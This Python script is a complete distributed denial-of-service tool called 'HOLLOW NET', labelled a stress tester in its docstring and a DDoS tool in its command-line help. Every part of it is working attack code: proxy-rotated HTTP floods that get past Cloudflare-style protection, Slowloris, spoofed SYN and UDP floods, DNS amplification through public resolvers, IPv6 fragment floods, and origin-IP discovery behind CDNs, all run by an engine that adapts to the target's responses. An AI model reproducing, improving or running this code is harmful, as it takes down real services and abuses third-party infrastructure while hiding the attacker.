#!/usr/bin/env python3
"""
HOLLOW NET — Ascended Production Edition
Multi‑vector, adaptive, stealth stress‑testing framework.

Prerequisites:
  pip install cloudscraper httpx[socks] h2 scapy beautifulsoup4 stem pysocks

Run with root for SYN flood / UDP raw / DNS amp.
Edit PROXY_FILE_PATH or use --proxy-file.
"""

import sys, os, time, re, random, json, logging, signal, argparse, socket, struct
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Thread, Lock, Event
from queue import Queue
from typing import List, Dict, Optional, Set, Tuple
from urllib.parse import urlparse, urljoin

# ---------- Optional imports ----------
try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    HAS_CLOUDSCRAPER = False

try:
    from scapy.all import IPv6, IPv6ExtHdrFragment, send as scapy_send
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

# ---------- Logging ----------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [HOLLOW] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
log = logging.getLogger("HollowNet")

# ---------- Constants ----------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/118.0",
]
REFERERS = ["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/"]

# ---------- Utility ----------
def random_ip() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def resolve_ip(host: str) -> str:
    try:
        return socket.gethostbyname(host)
    except Exception:
        return host


# ========== ORIGIN FINDER (crt.sh) ==========
class OriginFinder:
    """Discover real server IPs behind CDNs via Certificate Transparency logs."""

    @staticmethod
    def query_crtsh(domain: str) -> Set[str]:
        """
        Query crt.sh for all subdomains and return unique hostnames.
        Requires a proper User‑Agent to receive JSON.
        """
        url = f"https://crt.sh/?q=%25.{domain}&output=json"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        try:
            import requests
            resp = requests.get(url, headers=headers, timeout=30)
            if resp.status_code != 200:
                log.warning(f"crt.sh returned {resp.status_code}")
                return set()
            certs = resp.json()
            subdomains = set()
            for cert in certs:
                name_value = cert.get("name_value", "")
                for sub in name_value.split("\n"):
                    sub = sub.strip().lower()
                    if sub and "*" not in sub:
                        subdomains.add(sub)
            log.info(f"crt.sh: {len(subdomains)} unique subdomains for {domain}")
            return subdomains
        except Exception as e:
            log.error(f"crt.sh query failed: {e}")
            return set()

    @staticmethod
    def resolve_all(hostnames: Set[str]) -> Dict[str, str]:
        """Resolve hostnames to IPs, return mapping."""
        mapping = {}
        for host in hostnames:
            try:
                ip = socket.gethostbyname(host)
                mapping[host] = ip
            except Exception:
                pass
        return mapping

    @classmethod
    def find_origin_ips(cls, domain: str, known_cdn_ips: Optional[Set[str]] = None) -> Set[str]:
        """
        Full workflow: crt.sh → resolve → filter out CDN IPs → return candidate origin IPs.
        """
        hostnames = cls.query_crtsh(domain)
        if not hostnames:
            return set()
        resolved = cls.resolve_all(hostnames)
        candidates = set(resolved.values())
        # Simple filter: if we have a CDN IP list, exclude them
        if known_cdn_ips:
            candidates -= known_cdn_ips
        log.info(f"OriginFinder: {len(candidates)} candidate IP(s) after CDN filter")
        return candidates


# ========== PROXY MANAGER ==========
class ProxyManager:
    """Scrapes proxies from multiple sources + loads from file. Validates automatically."""

    PROXY_SOURCES = [
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/roosteronrails/proxy-list/main/proxies/http.txt",
    ]

    def __init__(self, proxy_file: Optional[str] = None, refresh_interval: int = 120):
        self.queue = Queue()
        self.validated: Set[str] = set()
        self.lock = Lock()
        self.running = True
        self.refresh_interval = refresh_interval

        # Load from file first (fastest)
        if proxy_file and os.path.isfile(proxy_file):
            self._load_from_file(proxy_file)

        # Start background scraper
        self.refresh_thread = Thread(target=self._auto_refresh, daemon=True)
        self.refresh_thread.start()

    def _load_from_file(self, path: str):
        try:
            with open(path, "r") as f:
                count = 0
                for line in f:
                    line = line.strip()
                    if line and re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", line):
                        if line not in self.validated:
                            self.queue.put(line)
                            self.validated.add(line)
                            count += 1
            log.info(f"ProxyManager: loaded {count} proxies from {path}")
        except Exception as e:
            log.error(f"Proxy file error: {e}")

    def _fetch_url(self, url: str) -> str:
        try:
            import requests
            resp = requests.get(url, timeout=10, headers={"User-Agent": random.choice(USER_AGENTS)})
            return resp.text
        except Exception:
            return ""

    def _auto_refresh(self):
        while self.running:
            log.debug("ProxyManager: scraping fresh proxies...")
            for src in self.PROXY_SOURCES:
                try:
                    content = self._fetch_url(src)
                    found = set(re.findall(r"\d+\.\d+\.\d+\.\d+:\d+", content))
                    with self.lock:
                        for proxy in found:
                            if proxy not in self.validated:
                                self.queue.put(proxy)
                                self.validated.add(proxy)
                except Exception:
                    pass
            # Validate a sample in background
            Thread(target=self._validate_sample, args=(20,), daemon=True).start()
            time.sleep(self.refresh_interval)

    def _validate_sample(self, n: int):
        import requests
        with self.lock:
            sample = list(self.validated)[:n]
        for proxy in sample:
            try:
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
                resp = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=5)
                if resp.status_code == 200:
                    log.debug(f"Proxy valid: {proxy}")
                else:
                    with self.lock:
                        self.validated.discard(proxy)
            except Exception:
                with self.lock:
                    self.validated.discard(proxy)

    def get_proxy(self) -> Optional[str]:
        """Return a random valid proxy or None."""
        try:
            with self.lock:
                if not self.queue.empty():
                    return self.queue.get()
        except Exception:
            pass
        return None

    def pool_size(self) -> int:
        with self.lock:
            return self.queue.qsize()

    def stop(self):
        self.running = False


# ========== TARGET MAPPER ==========
class TargetMapper:
    """Crawl target to discover endpoints, forms, and sub-paths."""

    def __init__(self, base_url: str, proxy_manager: Optional[ProxyManager] = None):
        self.base_url = base_url
        self.proxy_manager = proxy_manager
        self.endpoints: Set[str] = set()
        self.forms: List[Dict] = []

    def crawl(self, max_depth: int = 2):
        if not HAS_BS4:
            log.warning("BeautifulSoup not installed; crawling disabled.")
            return
        log.info(f"TargetMapper: crawling {self.base_url}")
        import requests
        to_visit = Queue()
        to_visit.put((self.base_url, 0))
        visited: Set[str] = set()
        while not to_visit.empty():
            url, depth = to_visit.get()
            if depth > max_depth or url in visited:
                continue
            visited.add(url)
            try:
                headers = {"User-Agent": random.choice(USER_AGENTS)}
                proxies = None
                if self.proxy_manager:
                    p = self.proxy_manager.get_proxy()
                    if p:
                        proxies = {"http": f"http://{p}", "https": f"http://{p}"}
                resp = requests.get(url, timeout=5, headers=headers, proxies=proxies, verify=False)
                if resp.status_code == 200:
                    self.endpoints.add(url)
                    soup = BeautifulSoup(resp.text, "html.parser")
                    for link in soup.find_all("a", href=True):
                        href = urljoin(url, link["href"])
                        if href.startswith(self.base_url) and href not in visited:
                            to_visit.put((href, depth + 1))
                    for form in soup.find_all("form"):
                        action = form.get("action")
                        method = form.get("method", "get").lower()
                        inputs = [inp.get("name") for inp in form.find_all("input") if inp.get("name")]
                        if action:
                            full_action = urljoin(url, action)
                            self.forms.append({"url": full_action, "method": method, "params": inputs})
                            self.endpoints.add(full_action)
            except Exception:
                pass
        log.info(f"TargetMapper: {len(self.endpoints)} endpoints, {len(self.forms)} forms")


# ========== HTTP FLOOD (cloudscraper + mandatory proxy) ==========
class HTTPFlood:
    """
    Uses cloudscraper (with js solver) for every request.
    Never falls back to a direct connection.
    """

    def __init__(self, target_urls: List[str], proxy_manager: ProxyManager):
        if not HAS_CLOUDSCRAPER:
            raise RuntimeError("cloudscraper not installed. Run: pip install cloudscraper")
        self.target_urls = target_urls
        self.proxy_manager = proxy_manager
        self.running = True

    def worker(self):
        scraper = cloudscraper.create_scraper()  # one per thread to avoid state issues
        while self.running:
            # Wait for a proxy — never go direct
            proxy = None
            while self.running:
                p = self.proxy_manager.get_proxy()
                if p:
                    proxy = {"http": f"http://{p}", "https": f"http://{p}"}
                    break
                time.sleep(0.05)

            try:
                url = random.choice(self.target_urls)
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Referer": random.choice(REFERERS),
                    "Cache-Control": "no-cache",
                }
                # HPACK‑style bomb: extra large header
                headers["X-Bomb"] = "A" * random.randint(1000, 4000)
                resp = scraper.get(url, headers=headers, proxies=proxy, timeout=10)
                resp.content  # read to keep socket busy
            except Exception:
                pass

    def launch(self, threads: int):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(self.worker) for _ in range(threads)]
            while self.running:
                time.sleep(1)
            for f in futures:
                f.cancel()

    def stop(self):
        self.running = False


# ========== SLOWLORIS ==========
class SlowlorisAttack:
    def __init__(self, host: str, port: int = 80, https: bool = False):
        self.host = host
        self.port = port
        self.https = https
        self.running = True
        self.sockets: List[socket.socket] = []
        self.lock = Lock()

    def _create_socket(self) -> Optional[socket.socket]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            if self.https:
                import ssl as ssl_mod
                ctx = ssl_mod.create_default_context()
                s = ctx.wrap_socket(s, server_hostname=self.host)
            s.connect((self.host, self.port))
            s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {self.host}\r\n".encode())
            s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            s.send("Accept-language: en-US,en;q=0.5\r\n".encode())
            return s
        except Exception:
            return None

    def maintain_pool(self, target_size: int = 200):
        while self.running:
            with self.lock:
                while len(self.sockets) < target_size:
                    s = self._create_socket()
                    if s:
                        self.sockets.append(s)
            time.sleep(0.5)

    def keep_alive(self):
        while self.running:
            with self.lock:
                for i, s in enumerate(self.sockets):
                    try:
                        s.send(f"X-random: {random.randint(1000, 9999)}\r\n".encode())
                    except Exception:
                        new = self._create_socket()
                        if new:
                            self.sockets[i] = new
                        else:
                            self.sockets.pop(i)
            time.sleep(random.uniform(5, 15))

    def launch(self):
        Thread(target=self.maintain_pool, daemon=True).start()
        Thread(target=self.keep_alive, daemon=True).start()
        while self.running:
            time.sleep(1)

    def stop(self):
        self.running = False
        for s in self.sockets:
            try:
                s.close()
            except Exception:
                pass


# ========== SYN FLOOD (throttled) ==========
class SYNFlood:
    def __init__(self, target_ip: str, port: int, pps_limit: int = 5000):
        self.target_ip = target_ip
        self.port = port
        self.pps_limit = pps_limit  # packets per second per thread
        self.running = True

    def worker(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            log.error("SYN flood requires root privileges.")
            return
        delay = 1.0 / self.pps_limit if self.pps_limit > 0 else 0
        while self.running:
            try:
                src_ip = random_ip()
                src_port = random.randint(1024, 65535)
                seq = random.randint(0, 4294967295)
                window = socket.htons(5840)
                ip_hdr = struct.pack(
                    "!BBHHHBBH4s4s",
                    0x45, 0, 40, random.randint(0, 65535), 0, 64, socket.IPPROTO_TCP, 0,
                    socket.inet_aton(src_ip), socket.inet_aton(self.target_ip),
                )
                tcp_hdr = struct.pack("!HHLLBBHHH", src_port, self.port, seq, 0, 0x50, 0x02, window, 0, 0)
                sock.sendto(ip_hdr + tcp_hdr, (self.target_ip, 0))
                if delay:
                    time.sleep(delay)
            except Exception:
                pass

    def launch(self, threads: int):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads):
                ex.submit(self.worker)
            while self.running:
                time.sleep(1)

    def stop(self):
        self.running = False


# ========== UDP FLOOD (throttled) ==========
class UDPFlood:
    def __init__(self, target_ip: str, port: int, packet_size: int = 1024, pps_limit: int = 2000):
        self.target_ip = target_ip
        self.port = port
        self.packet_size = packet_size
        self.pps_limit = pps_limit
        self.running = True

    def worker(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        delay = 1.0 / self.pps_limit if self.pps_limit > 0 else 0
        while self.running:
            try:
                sock.sendto(os.urandom(self.packet_size), (self.target_ip, self.port))
                if delay:
                    time.sleep(delay)
            except Exception:
                pass

    def launch(self, threads: int):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads):
                ex.submit(self.worker)
            while self.running:
                time.sleep(1)

    def stop(self):
        self.running = False


# ========== DNS AMPLIFICATION ==========
class DNSAmplification:
    def __init__(self, target_ip: str, resolver: str = "8.8.8.8", domain: str = "isc.org"):
        self.target_ip = target_ip
        self.resolver = resolver
        self.domain = domain
        self.running = True

    def _build_query(self) -> bytes:
        query = bytearray(b"\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00")
        for part in self.domain.encode().split(b"."):
            query.extend(bytes([len(part)]))
            query.extend(part)
        query.extend(b"\x00")
        query.extend(b"\x00\xff\x00\x01")  # ANY type
        return bytes(query)

    def worker(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            log.error("DNS amp requires raw sockets (root).")
            return
        query = self._build_query()
        while self.running:
            try:
                src_port = random.randint(1024, 65535)
                udp_len = 8 + len(query)
                ip_hdr = struct.pack(
                    "!BBHHHBBH4s4s",
                    0x45, 0, 20 + udp_len, random.randint(0, 65535), 0, 64, socket.IPPROTO_UDP, 0,
                    socket.inet_aton(self.target_ip), socket.inet_aton(self.resolver),
                )
                udp_hdr = struct.pack("!HHHH", src_port, 53, udp_len, 0)
                sock.sendto(ip_hdr + udp_hdr + query, (self.resolver, 53))
            except Exception:
                pass

    def launch(self, threads: int):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads):
                ex.submit(self.worker)
            while self.running:
                time.sleep(1)

    def stop(self):
        self.running = False


# ========== IPv6 FRAG ATTACK ==========
class IPv6FragAttack:
    def __init__(self, target_ip: str):
        self.target_ip = target_ip
        self.running = True

    def worker(self):
        if not HAS_SCAPY:
            return
        while self.running:
            pkt = IPv6(dst=self.target_ip) / IPv6ExtHdrFragment(offset=0, m=1, id=random.randint(0, 2**32 - 1)) / (b"A" * 100)
            scapy_send(pkt, verbose=0)
            time.sleep(0.001)

    def launch(self, threads: int):
        if not HAS_SCAPY:
            log.warning("scapy not installed; IPv6 frag attack disabled.")
            return
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads):
                ex.submit(self.worker)
            while self.running:
                time.sleep(1)

    def stop(self):
        self.running = False


# ========== FUSION ENGINE ==========
class FusionEngine:
    """
    Compose all vectors. Adjust weights dynamically.
    Network floods target origin IP (if found), HTTP floods target URL.
    """

    def __init__(self, config: Dict):
        self.config = config
        self.running = True
        self.attackers = {}
        self.weights = {
            "http": 0.5,
            "slowloris": 0.2,
            "syn": 0.1,
            "udp": 0.1,
            "dns": 0.05,
            "ipv6frag": 0.05,
        }
        # Default network target = resolved host
        self.net_target = resolve_ip(config["host"])

    def _check_http_status(self) -> Tuple[float, int]:
        try:
            import requests
            start = time.time()
            r = requests.get(self.config["http_url"], timeout=3)
            return time.time() - start, r.status_code
        except Exception:
            return 999, 0

    def adjust_weights(self):
        lat, code = self._check_http_status()
        if code == 0 or lat > 5:
            # HTTP seems down → shift to network floods
            self.weights = {"http": 0.05, "slowloris": 0.05, "syn": 0.35, "udp": 0.35, "dns": 0.1, "ipv6frag": 0.1}
        else:
            self.weights = {"http": 0.5, "slowloris": 0.2, "syn": 0.1, "udp": 0.1, "dns": 0.05, "ipv6frag": 0.05}

    def start(self):
        # ----- Origin discovery (optional) -----
        if self.config.get("find_origin", False):
            log.info("Fusion: running OriginFinder (crt.sh)...")
            candidates = OriginFinder.find_origin_ips(self.config["host"])
            if candidates:
                # Use the first candidate as network target
                self.net_target = candidates.pop()
                log.info(f"Fusion: network target set to origin IP {self.net_target}")
            else:
                log.warning("OriginFinder found no candidates; using default IP.")

        # ----- Proxy manager (always used) -----
        proxy_mgr = ProxyManager(proxy_file=self.config.get("proxy_file"))

        # ----- Endpoints -----
        mapper = TargetMapper(self.config["http_url"], proxy_mgr)
        if self.config.get("crawl", False):
            mapper.crawl()
        endpoints = list(mapper.endpoints) if mapper.endpoints else [self.config["http_url"]]

        # ----- Attackers -----
        http_flood = HTTPFlood(endpoints, proxy_mgr)
        slow = SlowlorisAttack(self.config["host"], self.config.get("port", 80), self.config.get("https", False))
        syn = SYNFlood(self.net_target, self.config.get("port", 80))
        udp = UDPFlood(self.net_target, self.config.get("port", 80))
        dns = DNSAmplification(self.net_target)
        ipv6 = IPv6FragAttack(self.net_target)

        self.attackers = {
            "http": http_flood,
            "slowloris": slow,
            "syn": syn,
            "udp": udp,
            "dns": dns,
            "ipv6frag": ipv6,
        }

        total_threads = self.config.get("total_threads", 500)
        threads_list = []

        # Launch each attacker with weight‑based thread allocation
        for name, atk in self.attackers.items():
            tcount = max(1, int(total_threads * self.weights.get(name, 0.0)))
            log.info(f"Fusion: starting {name} with {tcount} threads")
            t = Thread(target=atk.launch, args=(tcount,))
            t.daemon = True
            t.start()
            threads_list.append(t)

        # Dynamic adjustment loop
        start_time = time.time()
        duration = self.config.get("duration", 60)
        try:
            while self.running and time.time() - start_time < duration:
                self.adjust_weights()
                # Live proxy pool size
                log.debug(f"Proxy pool: {proxy_mgr.pool_size()}")
                time.sleep(10)
        except KeyboardInterrupt:
            log.info("Interrupted by user.")
        finally:
            for atk in self.attackers.values():
                atk.stop()
            proxy_mgr.stop()
            for t in threads_list:
                t.join(timeout=5)
            log.info("Fusion attack concluded.")


# ========== CLI ==========
def main():
    parser = argparse.ArgumentParser(description="HOLLOW NET — Ascended DDoS Tool")
    parser.add_argument("target", help="Target URL or IP (e.g., https://example.com or 10.0.0.1)")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-t", "--threads", type=int, default=500, help="Total threads (default: 500)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Attack duration in seconds (default: 60)")
    parser.add_argument("--ssl", action="store_true", help="Use HTTPS for Slowloris")
    parser.add_argument("--crawl", action="store_true", help="Crawl target for endpoints before attack")
    parser.add_argument("--find-origin", action="store_true", help="Query crt.sh to discover origin IP behind CDN")
    parser.add_argument("--proxy-file", type=str, default=None, help="Path to proxy list file (ip:port per line)")
    args = parser.parse_args()

    target = args.target
    parsed = urlparse(target)
    if parsed.scheme in ("http", "https"):
        host = parsed.hostname
        http_url = f"{parsed.scheme}://{host}"
        if args.port not in (80, 443):
            http_url += f":{args.port}"
        if parsed.path:
            http_url += parsed.path
    else:
        host = target
        http_url = f"http://{host}" if args.port != 443 else f"https://{host}"

    config = {
        "host": host,
        "port": args.port,
        "https": args.ssl or parsed.scheme == "https",
        "http_url": http_url,
        "total_threads": args.threads,
        "duration": args.duration,
        "find_origin": args.find_origin,
        "crawl": args.crawl,
        "proxy_file": args.proxy_file,
    }

    engine = FusionEngine(config)
    engine.start()


if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
    main()
